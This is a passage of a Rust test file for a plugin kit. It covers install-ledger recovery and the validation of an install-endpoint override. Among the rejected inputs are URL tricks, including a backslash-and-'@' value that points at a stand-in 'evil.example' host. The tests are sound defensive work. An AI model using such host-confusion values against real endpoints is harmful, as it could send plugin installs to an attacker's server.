    let second = recover()["result"]["recovered"].clone();
    assert_ne!(first, second);
    for (name, body) in [(first, "first"), (second, "second")] {
        let name = name.as_str().expect("name");
        assert_eq!(fs::read_to_string(dir.join(name)).expect("kept"), body);
    }

    // A newer Guard's record is not corrupt, so it stays where it is.
    let newer = r#"{"schema": "hol.plugin-kit.installs.v9", "installs": {}}"#;
    fs::write(dir.join("installs.json"), newer).expect("newer");
    assert_eq!(recover()["error"], json!("plugin_kit_ledger_invalid"));
    assert_eq!(
        fs::read_to_string(dir.join("installs.json")).expect("kept"),
        newer
    );
}

#[test]
fn the_kit_checks_an_endpoint_override_and_normalizes_its_origin() {
    let endpoint = |value: &str| call(json!({"command": "endpoint", "value": value}));
    for (value, origin) in [
        (
            "https://staging.example/api/guard/plugins/install-spec",
            "https://staging.example/",
        ),
        (
            "https://Staging.Example:443/spec",
            "https://staging.example/",
        ),
        (
            "https://staging.example:0443/spec",
            "https://staging.example/",
        ),
        (
            "https://staging.example:8443/spec",
            "https://staging.example:8443/",
        ),
        (
            "http://localhost:3000/api/guard/plugins/install-spec",
            "http://localhost:3000/",
        ),
        ("http://127.0.0.1/spec", "http://127.0.0.1/"),
        ("http://[::1]:3000/spec", "http://[::1]:3000/"),
        (
            "http://host.docker.internal:3000/spec",
            "http://host.docker.internal:3000/",
        ),
    ] {
        let response = endpoint(value);
        assert_eq!(
            response["result"]["origin"],
            json!(origin),
            "{value} {response}"
        );
    }
    for value in [
        "http://registry.example/spec",
        "http://10.0.0.5:3000/spec",
        "ftp://127.0.0.1/spec",
        "https://user:pass@registry.example/spec",
        "https://@registry.example/spec",
        "https://:@registry.example/spec",
        "https://registry.example/spec?slug=other",
        "https://registry.example/spec?",
        "https://registry.example/spec#x",
        "https://registry.example/spec#",
        "https://registry.example:/spec",
        "http://localhost:0/spec",
        "http://127.0.0.1:99999/spec",
        "https://my_portal.example/spec",
        "https://registry%2eexample/spec",
        "https://registry..example/spec",
        "https:///spec",
        "http://[bad/spec",
        "https://registry.example\\@evil.example/spec",
        "not a url",
        "",
    ] {
        let response = endpoint(value);
        assert_eq!(
            response["error"],
            json!("plugin_kit_install_endpoint_invalid"),
            "{value:?} {response}"
        );
    }
}
